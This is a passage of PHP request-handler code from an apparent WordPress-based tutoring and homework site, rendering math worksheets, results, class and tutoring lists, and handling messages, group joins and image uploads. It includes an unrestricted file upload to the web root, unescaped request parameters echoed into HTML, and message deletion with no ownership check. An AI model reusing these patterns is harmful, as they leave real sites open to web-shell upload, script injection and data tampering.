                        $html .= '<video class="word-prob-video" controls id="word-prob-video-' . $key . '" style="width:100%; max-height:100%; max-width:100%">';
                        $html .= '<source src="' . MWHtml::math_video_url($item['sound']) . '" type="video/mp4">';
                        $html .= 'Your browser does not support the video tag.';
                        $html .= '</video>';
                    else :
                        if ($item['image'] != ''):
                            $html .= '<img src="' . MWHtml::math_image_url($item['image']) . '" alt="" id="word-prob-step-' . $key . '" class="word-prob-steps canvas-layer"  data-ctrl="' . $item['param'] . ' "data-img-src="' . MWHtml::math_image_url($item['image']) . '">';
                        endif;
                    endif;
                    if ($item['sound'] != '' && $type_audio[1] == 'mp3'):
                        $html .= '<audio class="word-prob-sound" id="word-prob-sound-' . $key . '" preload="auto" style="width: 100%;">';
                        $html .= '<source src="' . MWHtml::math_sound_url($item['sound']) . '" type="audio/mpeg">';
                        $html .= '</audio>';
                    endif;
                endforeach;
            }
            break;
        case MATH_ASSIGNMENT_QUESTION_BOX:
            $html .= '<p id="boxtruefalse1">Green Box = Correct</p>';
            $html .= '<p id="boxtruefalse">Red Box = Incorrect</p>';
            foreach ($questions['q'] as $key => $item) :
                if ($item["x-cord"] != "") {
                    $html .= '<div id="qbox-step-' . $key . '" class="question-box-block-new">';
                    $html .= '<img src="' . MWHtml::math_image_url($item['image']) . '" alt="" style="display:block" class="word-prob-steps canvas-layer" data-img-src="' . MWHtml::math_image_url($item['image']) . '" >';
                    $html .= '<span id="txt-answer-question-box-' . $key . '" class="math-number input-box hidden" style=" width: auto;z-index:1" style="z-index:' . substr($key, 1) . ';' . ' left:' . $item['x-cord'] . '%; top:' . $item['y-cord'] . '%; width:' . $item['width'] . '%; height:' . $item['height'] . '%">';
                    $html .= '<input style="min-width: 100px;width: 126px;z-index:1"onkeypress="this.style.width = ((this.value.length + 1) * 20) + ' . 'px' . ';" data-answer="' . $item['answer'] . '" autocomplete="off" name="result[' . $key . ']" type="text" class="answer-box input-answer"></span>';
                    $html .= '</div>';
                    $count_q++;
                }
            endforeach;
            break;
        case MATH_ASSIGNMENT_EQUATION:
            $html .= '<p id="boxtruefalse1">Green Box = Correct</p>';
            $html .= '<p id="boxtruefalse1">Red Box = Incorrect</p>';
            foreach ($questions['q'] as $key => $item) :
                $html .= '<div class="flashcard-question equation-question hidden" id="flashcard-' . $key . '">';
                $arr_ = array('\n' => '<br>', '-' => '&#8211;');
                $repl = strtr($item['equation'], $arr_);
                $html .= '<span class="math-number">' . $repl . '</span>';
                $html .= '<span class="math-number input-box" style=" width: auto;"><input onkeypress="this.style.width = ((this.value.length + 1) * 20) + ' . "px" . ';" data-answer="' . $item['answer'] . '" name="result[' . $key . ']" type="text" style="min-width: 100px;width: 126px;" class="answer-box input-answer" autocomplete="off"></span>';
                $html .= '<span class="math-number">' . $item['note'] . '</span>';
                $html .= '</div>';
            endforeach;
            break;
    endswitch;
    //$html .='<div id="cursors"></div>';
    $html .= '<canvas id="math" class="canvas-math hidden">Your browser needs to support canvas for this to work!</canvas>';
    $html .= '<div id="divrubber" title="drag to erase with checkbox signed" alt="drag to erase with checkbox signed">';
    $html .= '<div id="controlrubber" class="css-img-erase"></div>';
    $html .= '</div>';
    $html .= '</div>';

    if ($teacher_taking_test) {
        $html .= '<div id="submit-homework-modal" class="modal fade modal-green" data-keyboard="true" aria-hidden="true" data-backdrop="static">';
    } else {
        $html .= '<div id="submit-homework-modal" class="modal fade modal-green" data-keyboard="true" aria-hidden="true" data-backdrop="">';
    }
    $html .= '<div class="modal-dialog">';
    $html .= '<div class="modal-content" style="border: 2px solid #000;">';
    $html .= '<div class="modal-header" style="background: #838383;margin: 0px;">';
    if (!$teacher_taking_test) {
        $html .= '<h3 style="padding-left: 1% !important">' . 'Submitting Homework' . '</h3>';
    } else {
        $html .= '<h3 style="padding-left: 1% !important">' . 'The End of Test' . '</h3>';
    }
    $html .= '</div>';
    if (!$teacher_taking_test) :
        if (!empty($homework_assignment->next_homework_id)) {
            $html .= '<div class="modal-body" style="background: #fff !important;color: #000">';
            $html .= '<strong>' . 'You have completed this homework.' . '</strong><br>';
            $html .= '<hr style="border-top: 2px solid #DCDCDC">';
            $html .= '<span>Do you want to start next worksheet?</span>';
            $html .= '</div>';
            $html .= '<div class="modal-footer" style="background: #fff !important">';
            $html .= '<div class="row">';
            if (empty($homework_assignment->next_homework_id)) :
                $html .= '<div class="col-sm-12 form-group">';
                $html .= '<button type="submit" name="submit-homework-finish" style="background: #4C4C4C !important;color: #E3C264" class="btn btn-block orange submit-lesson-btn" data-loading-text="' . 'Submitting...' . '" data-ref="' . $_ref_url . '"></span>' . 'Yes. Start Next Worksheet' . '</button>';
                $html .= '</div>';
            else :
                $html .= '<div class="col-sm-6 form-group">';
                $html .= '<button type="submit" name="submit-homework-next" id="btn-next-worksheet" style="background: #4C4C4C !important;color: #E3C264" class="btn btn-block submit-lesson-btn" data-loading-text="' . 'Submitting...' . '" data-ref="' . $_next_url . '" &prid="' . $id . '" &ismode="' . $homework_assignment->for_practice . '"&sat=".$_GET["sat"]."&gid=".$_GET["gid"]' . '"></span>' . 'Yes. Start Next Worksheet' . '</button>';
                $html .= '</div>';
                $html .= '<div class="col-sm-6 form-group">';
                $html .= '<button type="button" id="close-modal-homework" style="background: #B6B6B6 !important;color: #fff;" class="btn btn-block grey submit-lesson-btn" data-loading-text="' . 'Submitting...' . '" data-ref="' . $_ref_url . '"></span>' . 'No. Submit and Quit' . '</button>';
                $html .= '</div>';
            endif;
            $html .= '<input type="hidden" name="ref" id="input-ref" value="' . $_next_url . '" &prid=" ' . $id . ' "&ismode="' . $homework_assignment->for_practice . '" &sat=".$_GET["sat"]."&gid=".$_GET["gid"]' . '">';
            $html .= '</div>';
            $html .= '</div>';
        } else {
            $html .= '<div class="modal-body" style="background: #fff !important;color: #000;">';
            $html .= '<strong>' . 'You have completed this homework.' . '</strong><br>';
            $html .= '</div>';
            $html .= '<div class="modal-footer" style="background: #fff !important;padding-bottom: 25px">';
            $html .= '<div class="row">';
            $html .= '<input type="hidden" name="ref" id="input-ref" value="' . $_next_url . '"&prid="' . $id . '"&ismode="' . $homework_assignment->for_practice . '"&sat="' . $_GET["sat"] . '"&gid="' . $_GET["gid"] . '">';
            $html .= '</div>';
            $html .= '</div>';
        }
    else:
        $html .= '<div class="modal-body">';
        $html .= 'You have completed this test.';
        $html .= 'If you want to leave a message to the admin, type it in the box below.';
        $html .= 'Click OK to submit.';
        $html .= '<hr>';
        $html .= '<div class="form-group">';
        $html .= '<textarea  class="form-control" id="txt-feedback" placeholder="' . 'Leave a Message to the Teacher (Optional)' . '" style="resize: none; height: 111px; border-radius: 0px;font-size: 18px;margin-bottom: 3%;margin-top: 1%"></textarea>';
        $html .= '</div>';
        $html .= '</div>';
        $html .= '<div class="modal-footer">';
        $html .= '<div class="row">';
        $html .= '<div class="col-sm-12">';
        $html .= '<div class="form-group">';
        $html .= '<button type="submit" name="submit-homework" class="btn btn-block orange submit-lesson-btn" data-loading-text="' . 'Submitting...' . '" data-ref="' . $_ref_url . '"><span class="icon-accept"></span>' . OK . '</button>';
        $html .= '</div>';
        $html .= '</div>';
        $html .= '</div>';
        $html .= '<input type="hidden" name="ref" id="input-ref" value="' . $_next_url . '&prid=' . $id . "&ismode=" . $homework_assignment->for_practice . "&sat=" . $_GET["sat"] . "&gid=" . $_GET["gid"] . '"> ';
        if ($teacher_taking_test) :
            $html = '<input type="hidden" name="pass" value="' . $pass . '" />';
        endif;
        $html .= '</div>';

    endif;
    $html .= '</div>';
    $html .= '</div>';
    $html .= '</div>';

//    $html .= '</form>';
    $html .= '</div>';
    $html .= '</div>';
    $html .= '</div>';

    echo $html;
    die;
}
// Load html for modal-view-result-writing
if ($task == 'view_result_writing') {
    $id = $_REQUEST['hw_id'];
    $select = $_REQUEST['select'];
    $result = MWDB::get_result_worksheet($id);
    $name = MWDB::get_name_user($id);
    $question = json_decode($result->questions);
    $answer = json_decode($result->answers);
    $homework_sheets = MWDB::get_homework_sheets(ASSIGNMENT_WRITING);
    //var_dump($homework_sheets);die;
    $homework_sheets = MWDB::get_homework_sheets(ASSIGNMENT_WRITING);
    $check = MWDB::check_homework_is_practive($id);
    $mode = $check[0]->for_practice == 1 ? "practice" : "homework";
    $sheet_list = $homework_sheets;
    if ($mode == 'practice') {
        $practice_sheets = MWDB::get_practice_sheets(ASSIGNMENT_WRITING);

        foreach ($homework_sheets as $key => $item) {
            if ($item->private) {
                $teacher_sheet_suggestion[$item->grade] = $item->grade;
            } else {
                $public_sheet_grade_suggestion[$item->grade] = $item->grade;
                $public_sheet_sheet_suggestion[$item->sheet_name] = $item->sheet_name;
            }
        }

        $sheet_list = $practice_sheets;
    }

    // check homework id
    if (!$id) {

        $homework_assignment = MWDB::get_homework_assignment_by_id($id);
        $sid = $homework_assignment->sheet_id;
    }
    foreach ($sheet_list as $item) {
        $_disabled_js = ($item->homework_type_id == HOMEWORK_SUBSCRIBED && !get_ws_subscribed()) ? 'disabled' : '';
        if ($_disabled_js == '') {
            $_disabled_js = 'disabled';
            $class = 'classdisable';
        } else {
            $class = '';
        }
        if (is_mw_super_admin() || is_mw_admin()) {
            $_disabled = '';
        }

        $select_grade_sheets[$item->grade] .= '<option data-sheet-id="' . $item->sheet_id . '" class="' . $class . '" value="' . $item->sheet_name . '"' . $_disabled . '>' . $item->sheet_name . '</option>';
        //        var_dump($sid);die;
        //        if ($sid && $sid == $item->sheet_id) {
        $sheet = $item;

        // we only need 1 sheet in homework mode if sheet id is provided

        if ($mode == 'homework') {
            $js_homework_list = array();
            $sheet_list = array($item);
            break;
        }
        //        }
        //
                if ($mode == 'homework' && $sheet->homework_id != $item->homework_id) {
            $js_homework_list[] = '{hid: ' . $item->homework_id . ', sid: ' . $item->sheet_id . ', grade: "' . $item->grade . '", sheet_num: "' . $item->sheet_name . '"}';
        }
    }
    // get next homework
    if (!empty($homework_assignment->next_homework_id)) {
        $next_homework = MWDB::get_homework_assignment_by_id($homework_assignment->next_homework_id);
        $sheet->next_homework_id = $homework_assignment->next_homework_id;
        $sheet->next_sheet = empty($next_homework->name) ? $next_homework->sheet_name : $next_homework->name;
        $sheet->next_assignment_id = $next_homework->assignment_id;
    }
    $sheet_total = count($sheet_list);
    $words = json_decode($sheet->questions);

    if ($do == 'get_result_writing') {


        $user_avatar = ik_get_user_avatar($homework_result[0]->graded_by);

        $html = '';
        $arr_quiz = json_decode($sheet->questions);
        $html .= '<span class="css-name-sheet">';
        if ($arr_quiz->quiz != '') {
            $html .= $arr_quiz->quiz[$select];
        }
        $html .= '</span>';
        $html .= '<div style="padding: 1% 5% 1% 5%;">';
        if (!empty($user_avatar)) :
            $html .= '<img src="' . $user_avatar . '" width="130" height="140" alt="" class="css-image-user-load-db">';
        else :
            $html .= '<div class="css-image-user"></div>';
        endif;
        $html .= '<div class="result-info">';
        $html .= '<div><span class="css-7D7D7D">' . "Teacher: " . '</span>';
        $html .= '<span class="css-7C7C7C">' . "N/A" . '</span></div>';
        $html .= '<div><span class="css-7D7D7D">' . "Student's Name: " . '</span>';
        $html .= '<span class="css-7C7C7C">' . $name->user_nicename . '</span></div>';
        $html .= '<div><span class="css-7D7D7D">' . "Level: " . '</span>';
        $html .= '<span class="css-7C7C7C">' . $result->lv . '</span></div>';
        $html .= '<div><span class="css-7D7D7D">' . "Dictionary: " . '</span>';
        if ($result->libname == '') {
            $html .= '<span class="css-7C7C7C">' . "N/A" . '</span>';
        } else {
            $html .= '<span class="css-7C7C7C">' . $result->libname . '</span>';
        }
        $html .= '</div>';
        $html .= '<div><span class="css-7D7D7D">' . "Last Attempt: " . '</span>';
        $html .= '<span class="css-7C7C7C">' . $name->attempted_on . '</span></div>';

        $html .= '<div class="css-mobile-display">';
        $html .= '<div style="width:84%"><span class="css-7D7D7D">' . "Completed Date: " . '</span>';
        $html .= '<span class="css-7C7C7C">' . $name->submitted_on . '</span></div>';
        $html .= '<div class="css-mobile-right"><span class="css-rs-score">' . "Score: " . '</span>';
        if ($result->score != 0) {
            $html .= '<span class="rs-score1">' . $result->score . '%</span></div>';
        } else {
            $html .= '<span class="rs-score1">Not Graded</span></div>';
        }
        $html .= '</div>';
        $html .= '</div>';
        $html .= '<div class="line-result"></div>';
        //    foreach load table question
        $words = json_decode($sheet->questions, true);
        $word_total = count($words['question']);

        $html .= '<div id="div-all-select" style="height: 20px !important;">';
        $html .= '<div id="div-select" class="css-option-writing">';
        $html .= '<ul id="css-ul-dropdown" class="css-image-option-writing image-select-ikmath">';
        $html .= '<li class="init">Page 1</li>';
        for ($i = 0; $i < $word_total; $i++) {
            $j = $i + 1;
            $html .= '<li data-value="' . $j . '" class="click-test-ikmath border-left-right-ul-dropdown" style="display:none">Page ' . $j . '</li>';
        }
        $html .= '</ul>';
        $html .= '</div>';
        $html .= '</div>';

        $html .= '<div class="css-assign">ASSIGNMENT</div>';
        $arr = json_decode($sheet->questions);
        $html .= '<div class="css-assing">';
//        var_dump($arr);die;
        if ($arr->question != '') {
            $html .= $arr->question[$select];
        }
        $html .= '</div>';
        $html .= '<div class="css-ans">YOUR ANSWER</div>';
        $arr_ans = json_decode($result->answers);
        //    echo '<pre>';
        //    print_r($ques);
        $html .= '<div class="css-answer">';
        $str_ans = "q" . $select;
        if ($arr_ans != '') {
            $html .= $arr_ans->$str_ans;
        }
        $html .= '</div>';
        $html .= '<div class="css-note">NOTE BY TEACHER</div>';
        $arr_comment = json_decode($result->teacher_comments);
        $html .= '<div class="css-note1">';
        if ($arr_comment != '') {
            $html .= $arr_comment->$str_ans;
        }
        $html .= '</div>';
        //    $html .= '<div class="css-note1">'.$result->teacher_comments.'</div>';

        echo $html;
        die;
    }
    if ($do == 'update-question') {
        $id = $_REQUEST['hw_id'];
        $select = $_REQUEST['select'];
        echo $words->quiz[$select];
        die;
    }
    if ($do == 'update-assignment') {
        $id = $_REQUEST['hw_id'];
        $select = $_REQUEST['select'];
        $arr = json_decode($sheet->questions);
        echo $arr->question[$select];
        die;
    }
    if ($do == 'update-answer') {
        $id = $_REQUEST['hw_id'];
        $select = $_REQUEST['select'];
        $arr_ans = json_decode($result->answers);
        $str_ans = "q" . $select;
        echo $arr_ans->$str_ans;
        die;
    }
    if ($do == 'update-note-teacher') {
        $id = $_REQUEST['hw_id'];
        $select = $_REQUEST['select'];
        $arr_comment = json_decode($result->teacher_comments);
        $str_ans = "q" . $select;
        echo $arr_comment->$str_ans;
        die;
    }
}
/**
 * load class ikmath course follow selected 
 */
if ($task == 'load_class_ikmath_course') {
    $id_class_selected = (int) $_REQUEST['id_class_selected'];
    if ($id_class_selected == 0) {
        $html = '';
        $html .= '<tr>';
        $html .= '<td style="padding-left: 15px;width: 20% !important;">You haven’t joined any groups yet. Please select from.';
        $html .= '<a href="' . home_url() . '?r=sat-preparation/emathk&client=math-emathk" style="text-decoration: underline;"> ikMath Course </a>Section.</td>';
        $html .= '</tr>';
        for ($i = 0; $i < 13; $i++) {
            $html .= '<tr ><td style="height : 35px; width: 1% !important;" colspan="5" ></td></tr>';
        }
    } else {
        $current_page = max(1, get_query_var('page'));
        $filter['orderby'] = 'ordering';
        $filter['offset'] = 0;
        $filter['items_per_page'] = 99999999;
        $filter["class_type"] = $id_class_selected;
        $filter['group_type'] = GROUP_CLASS;

        $groups = MWDB::get_groups($filter, $filter['offset'], $filter['items_per_page']);
        //echo '<pre>';print_r($filter);die;
        $html = '';
        if (count($groups->items) > 0) :
            foreach ($groups->items as $group) :
                $class_type_id = $group->class_type_id;
                $html .= '<tr>';
                $html .= '<td style="padding-left: 15px;width: 68% !important;">' . $group->content . '</td>';

                if ($group->no_homeworks == 0) {
                    $html .= '<td>0</td>';
                } else {
                    $html .= '<td>' . $group->no_homeworks . '</td>';
                }

                $html .= '<td><a href="#" class="class-detail-btn css-link color-0">Click</a>';
                $html .= '<div>';
                $filter['homework_result'] = true;
                $filter['user_id'] = get_current_user_id();
                $filter['is_active'] = 1;
                $homeworks = MWDB::get_group_homeworks($group->id, $filter, $filter['offset'], $filter['items_per_page']);
                $html .= $group->detail;
                $html .= '<h3 class="modal-title" style="color: #708b23;padding-left: 2px;" id="myModalLabel">List Homework in Group ' . $group->content . ' </h3>';
                foreach ($homeworks->items as $hw):
                    $html .= ' - ' . $hw->sheet_name . "<br>";
                endforeach;
                $html .= '<div>';
                $html .= '</td>';
                $html .= '<td>';
                $sat_results = get_sat_class_score($group->id);
                if (is_sat_class_completed($sat_results)) :
                    $html .= '<a href="' . home_url() . '/?r=online-learning&back-ikmath=' . $id_class_selected . '&issat-math=1&amp;gid=' . $group->id . '" class="view-score" data-jid="' . $group->id . '">OPEN</a>';
                else:
                    $html .= '<a href="' . home_url() . '/?r=online-learning&back-ikmath=' . $id_class_selected . '&issat-math=1&amp;gid=' . $group->id . '" class="color-0 css-link">OPEN</a>';
                endif;
                $html .= '<table class="hidden">';
                $html .= '<tbody>';
                foreach ($sat_results as $result) :
                    $html .= '<tr>';
                    $html .= '<td>' . $result->sheet_name . '</td>';
                    $html .= '<td>' . $result->score . '</td>';
                    $html .= '<td><a href="' . locale_home_url() . '/?r=online-learning&hid=' . $result->hid . '" class="btn btn-default btn-tiny grey" >OPEN</a></td>';
                    $html .= '<td>' . $result->submitted_on . '</td>';
                    $html .= '</tr>';
                endforeach;
                if (is_sat_class_completed($sat_results)) :
                    if (check_admin_by_id($group->uid)):
                        $html .= '<tr>';
                        $html .= '<td colspan="3"></td>';
                        $html .= '<td><a href="' . home_url() . '/?r=online-learning&amp;gid=' . $group->id . '">OPEN</a></td>';
                        $html .= '</tr>';
                    endif;
                endif;
                $html .= '</tbody>';
                $html .= '</table>';
                $html .= '</td>';
                $html .= '<td></td>';
                $html .= '</tr>';
            endforeach;
        endif;
        ?>
        <?php
    }
    echo $html;
    die;
}
/**
 * load class ikmath course follow selected 
 */
/**
 * load class ikmath course follow selected 
 * $id = 0 - load all  
 * id = 1 - load Purchased & Waiting
 * id = 2 - load confirmed
 * id = 3 - load canceled
 */
if ($task == 'load_tutoring_plan') {
    $id = (int) $_REQUEST['id_schedule'];
    $groups = MWDB::get_tutoring_plan($id);
    $waiting = MWDB::get_list_waitting_tutoring();
    $confirmed = MWDB::get_list_confirmed_tutoring();
    $arr_yesterday = [];
    foreach ($waiting as $value) {
//        var_dump($value);die;
        // Xu ly date
        $_date = $value->date;
        $_time = $value->time;
        $_time = explode("~", $_time); // 1:1:AM
        $_st = explode(":", $_time[1]);
        $_st_hour = $_st[0];
        $_st_minute = $_st[1];
        $_st_part = $_st[2];
//        if(trim($_st_part) == "PM"){
//            $_st_hour = (int)$_st_hour + 12;
//        }
        $newDate = date("d-m-Y", strtotime($_date));
        $newDate = $newDate . " " . $_st_hour . ":" . $_st_minute;
        $time_zone = (int) $value->time_zone;
        $data = (int) strtotime($newDate);
        $b = (int) strtotime('now +' . $time_zone . 'hour');
        $c = (int) strtotime('+1day +' . $time_zone . 'hour');
        $d = date("d-m-Y H:i", $b);
        $now = (int) strtotime($d);
//        var_dump($newDate."__");
//        var_dump($now."__");
//        var_dump($c);die;
        if ($data > $now && $data < $c) {
//            var_dump(1);die;
            $id = $value->id;
            array_push($arr_yesterday, $id);
        }
    }
    foreach ($confirmed as $value) {
//        var_dump($value);die;
        // Xu ly date
        $_date_cf = $value->date;
        $_time_cf = $value->time;
        $_time_cf = explode("~", $_time_cf); // 1:1:AM
        $_st_cf = explode(":", $_time_cf[1]);
        $_st_hour_cf = $_st_cf[0];
        $_st_minute_cf = $_st_cf[1];
        $_st_part_cf = $_st_cf[2];
//        if(trim($_st_part_cf) == "PM"){
//            $_st_hour_cf = (int)$_st_hour_cf + 12;
//        }
        $time_zone1 = (int) $value->time_zone;
        $newDate_cf = date("d-m-Y", strtotime($_date_cf));
        $newDate_cf = $newDate_cf . " " . $_st_hour_cf . ":" . $_st_minute_cf;
        $data_cf = (int) strtotime($newDate_cf);
        $b_cf = (int) strtotime('now +' . $time_zone1 . 'hour');
        $c_cf = (int) strtotime('+1day +' . $time_zone1 . 'hour');
        $d_cf = date("d-m-Y H:i", $b_cf);
        $now_cf = (int) strtotime($d_cf);
//        var_dump($data_cf);
//        var_dump("___".$data_cf);
//        var_dump("___".$newDate_cf);die;
        if ($data_cf > $now_cf && $data_cf < $c_cf) {
//            var_dump(1);die;
            $id_cf = $value->id;
            array_push($arr_yesterday, $id_cf);
        }
    }

    if (empty($groups)) {
        $html = '';
        $html .= '<tr>';
        if (count(MWDB::get_tutoring_plan(0)) > 0) {
            if ($id == 1) {
                $html .= '<td style="padding-left: 15px;width: 100% !important;">No sessions pending.';
            } else if ($id == 2) {
                $html .= '<td style="padding-left: 15px;width: 100% !important;">You have no confirmed tutoring session.';
            } else if ($id == 3) {
                $html .= '<td style="padding-left: 15px;width: 100% !important;">No canceled sessions.';
            } else {
                $html .= '<td style="padding-left: 15px;width: 100% !important;">You haven’t joined any groups yet. Please select from.';
                $html .= '<a href="' . home_url() . '/?r=tutoring-plan" style="text-decoration: underline;"> Tutoring Plan </a>Section.</td>';
            }
        } else {
            $html .= '<td style="padding-left: 5%;width: 100% !important;">You haven’t joined any groups yet. Please select from.';
            $html .= '<a href="' . home_url() . '/?r=tutoring-plan" style="text-decoration: underline;"> Tutoring Plan </a>Section.</td>';
        }
        $html .= '</tr>';
    } else {
        $html = '';
        foreach ($groups as $group) :
            $full_time = $group->time;
            $str = explode("~", $full_time);
            $str1 = explode(":", $str[0]);
            $str2 = explode(":", $str[1]);
            if ($str1[0] > 12) {
                $str1[0] = $str1[0] - 12;
            }
            if ($str1[0] < 10) {
                $str1[0] = "0" . $str1[0];
            }
            if ($str2[0] > 12) {
                $str2[0] = $str2[0] - 12;
            }
            if ($str2[0] < 10) {
                $str2[0] = "0" . $str2[0];
            }
            $time = $str1[0] . ':' . $str1[1] . ':' . $str1[2] . '~ ' . $str2[0] . ':' . $str2[1] . ':' . $str2[2];
            if (in_array($group->id, $arr_yesterday)) {
                $html .= '<tr style="background-color: #fff !important;">';
                $html .= '<td style="padding: 3px 5px 3px 10px;"><input type="button" class="btn-start-tutoring-red" value="Start"></td>';
                $html .= '<td style="padding-left: 15px;width: 40% !important;">' . $group->private_subject . '</td>';
                if ($group->assigned_id != null) {
                    $html .= '<td style="width: 14% !important;">' . $group->assigned_id . '</td>';
                } else {
                    $html .= '<td style="width: 14% !important;">N/A</td>';
                }
                $html .= '<td style="width: 17% !important;">' . $group->date . '</td>';
                $html .= '<td style="width: 19% !important;padding-left:0px;padding-right:0px">' . $time . '</td>';
                if ($group->canceled == 1) {
                    $html .= '<td class="css-link" style="width: 12% !important;text-decoration:none !important;color:#0065bb !important;">Canceled</td>';
                } else if ($group->confirmed == 0) {
                    $html .= '<td class="css-link" style="width: 12% !important;text-decoration:none !important;color:#6e6d6d !important;">Waiting</td>';
                } else {
                    $html .= '<td class="css-link" style="width: 12% !important;text-decoration:none !important;color:#cd003d !important;">Confirmed</td>';
                }
                $html .= '<td></td>';
                $html .= '</tr>';
            }
        endforeach;
        foreach ($groups as $group) :
            if (in_array($group->id, $arr_yesterday)) {
                
            } else if ($group->paid == 1 && $group->canceled == 0) {
                $html .= '<tr>';
                $html .= '<td style="padding: 3px 5px 3px 10px;"><input type="button" class="btn-start-tutoring" value="Start"></td>';

                $html .= '<td style="padding-left: 15px;width: 40% !important;">' . $group->private_subject . '</td>';
                if ($group->assigned_id != null) {
                    $html .= '<td style="width: 14% !important;">' . $group->assigned_id . '</td>';
                } else {
                    $html .= '<td style="width: 14% !important;">N/A</td>';
                }
                $html .= '<td style="width: 17% !important;">' . $group->date . '</td>';
                $html .= '<td style="width: 19% !important;padding-left:0px;padding-right:0px">' . $time . '</td>';
                if ($group->canceled == 1) {
                    $html .= '<td class="css-link" style="width: 12% !important;text-decoration:none !important;color:#0065bb !important;">Canceled</td>';
                } else if ($group->confirmed == 0) {
                    $html .= '<td class="css-link" style="width: 12% !important;text-decoration:none !important;color:#6e6d6d !important;">Waiting</td>';
                } else {
                    $html .= '<td class="css-link" style="width: 12% !important;text-decoration:none !important;color:#cd003d !important;">Confirmed</td>';
                }
                $html .= '<td></td>';
                $html .= '</tr>';
            }
        endforeach;
        foreach ($groups as $group) :
            if (in_array($group->id, $arr_yesterday) || ($group->paid == 1 && $group->canceled == 0)) {
                
            } else {
                $html .= '<tr>';
                $html .= '<td style="padding: 3px 5px 3px 10px;"><input type="button" class="btn-start-tutoring" value="Start"></td>';

                $html .= '<td style="padding-left: 15px;width: 40% !important;">' . $group->private_subject . '</td>';
                if ($group->assigned_id != null) {
                    $html .= '<td style="width: 14% !important;">' . $group->assigned_id . '</td>';
                } else {
                    $html .= '<td style="width: 14% !important;">N/A</td>';
                }
                $html .= '<td style="width: 17% !important;">' . $group->date . '</td>';
                $html .= '<td style="width: 19% !important;padding-left:0px;padding-right:0px">' . $time . '</td>';
                if ($group->canceled == 1) {
                    $html .= '<td class="css-link" style="width: 12% !important;text-decoration:none !important;color:#0065bb !important;">Canceled</td>';
                } else if ($group->confirmed == 0) {
                    $html .= '<td class="css-link" style="width: 12% !important;text-decoration:none !important;color:#6e6d6d !important;">Waiting</td>';
                } else {
                    $html .= '<td class="css-link" style="width: 12% !important;text-decoration:none !important;color:#cd003d !important;">Confirmed</td>';
                }
                $html .= '<td></td>';
                $html .= '</tr>';
            }
        endforeach;
        ?>
        <?php
    }
    if (count($groups) < 13) {
        for ($i = count($groups); $i < 13; $i++) {
            $html .= '<tr ><td class="row-full-1" colspan="6" ></td><td></td></tr>';
        }
    }
    echo $html;
    die;
}
/**
 * remove message in group 
 */
if ($task == 'groupmessageremove') {
    $id = $_REQUEST['id'];
    MWDB::remove_group_messages($id);
    echo json_encode($id);
    die;
}

/**
 * get private message  send
 */
if ($task == 'getsentmsg') {
    if (isset($_REQUEST['id'])) {
        $cur_message = MWDB::get_sent_private_message($_REQUEST['id']);
        $message = $cur_message->message;
        echo json_encode($message);
    }
    die;
}
/**
 * get private message  received
 */
if ($task == 'getreceivedmsg') {
    if (isset($_REQUEST['id'])) {
        $cur_message = MWDB::get_received_private_message($_REQUEST['id']);
        $message = $cur_message->message;
        echo json_encode($message);
    }
    die;
}
/**
 * insert student to group 
 */
if ($task == 'joingroup') {
    if (is_null(MWDB::check_user_group($_REQUEST['group_id']))) {
        if (ik_deduct_user_points($_REQUEST['point']) !== false) {
            $data = array(
                'group_id' => $_REQUEST['group_id'],
                'student_id' => get_current_user_id(),
                'absented' => 0,
                'joined_date' => date("Y-m-d"),
            );

            MWDB::insert_group_user($data);
            echo 1;
        } else {
            echo 0;
        }
    } else {
        echo 2;
    }
    die;
}

/*
 * remove an item from search history
 */
if ($task == 'history') {
    if ($do == 'remove') {
        remove_search_history_item($_REAL_POST['id'], $_REAL_POST['d']);
    }
}

/*
 * upload image js
 */
if ($task == 'uploadimage') {
    if (isset($_FILES['upload_file'])) {
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $_SERVER['DOCUMENT_ROOT'] . "/wp-content/uploads/imgstudy/" . $_FILES['upload_file']['name'])) {
//                        move_uploaded_file($_FILES['upload_file']['tmp_name'], "http://ikteacher.moe/wp-content/uploads/imgstudy/" . $_FILES['upload_file']['name']);
            echo substr($_SERVER['DOCUMENT_ROOT'], 0, -12) . "/wp-content/uploads/imgstudy/" . $_FILES['upload_file']['name'];
        } else {
            echo $_FILES['upload_file']['name'] . " KO";
        }
        exit;
    } else {
        echo "No files uploaded ...";
    }
}

/*
 * return sheet content
 */
if ($task == 'sheets') {
    $sid = $_GET['sid'];

    if (isset($_GET['readonly'])) {
        if ($_GET['readonly'])
            $readonly = ' readonly="readonly"';
        else
            $readonly = '';
    } else
        $readonly = '';

    $result = $wpdb->get_row($wpdb->prepare(
                    'SELECT * FROM ' . $wpdb->prefix . 'dict_sheets WHERE id = %d', array($sid)
    ));

    if (is_null($result)) {
        die('0');
    }
    $questions = json_decode($result->questions, true);

    $html = '<tbody>';
    switch ($result->assignment_id) {
        case ASSIGNMENT_SPELLING:
            for ($i = 1; $i <= 20; $i++) {
                $html .= '<tr>';
                $html .= '<td><input type="text" value="' . esc_html($questions[$i - 1]) . '"' . $readonly . '></td>';
                $html .= '</tr>';
            }
            break;
        case ASSIGNMENT_VOCAB_GRAMMAR:
            for ($i = 1; $i <= 20; $i++) {
                $html .= '<tr>';
                $html .= '<td><input type="text" value="' . esc_html($questions['question'][$i - 1]) . '"></td>';
                $html .= '<td><input type="text" value="' . esc_html($questions['c_answer'][$i - 1]) . '"' . $readonly . '></td>';
                $html .= '<td><input type="text" value="' . esc_html($questions['w_answer1'][$i - 1]) . '"' . $readonly . '></td>';
                $html .= '<td><input type="text" value="' . esc_html($questions['w_answer2'][$i - 1]) . '"' . $readonly . '></td>';
                $html .= '<td><input type="text" value="' . esc_html($questions['w_answer3'][$i - 1]) . '"' . $readonly . '></td>';
                $html .= '<td><input type="text" value="' . esc_html($questions['w_answer4'][$i - 1]) . '"' . $readonly . '></td>';
                $html .= '<td><input type="text" value="' . esc_html($questions['quiz'][$i - 1]) . '"></td>';
                $html .= '</tr>';
            }
            break;
        case ASSIGNMENT_READING:
            for ($i = 1; $i <= 20; $i++) {
                $html .= '<tr>';
                $html .= '<td><input type="text" value="' . $questions['question'][$i - 1] . '"></td>';
                $html .= '<td><input type="text" value="' . $questions['c_answer'][$i - 1] . '"></td>';
                $html .= '<td><input type="text" value="' . $questions['w_answer1'][$i - 1] . '"></td>';
                $html .= '<td><input type="text" value="' . $questions['w_answer2'][$i - 1] . '"></td>';
                $html .= '<td><input type="text" value="' . $questions['w_answer3'][$i - 1] . '"></td>';
                $html .= '<td><input type="text" value="' . $questions['w_answer4'][$i - 1] . '"></td>';
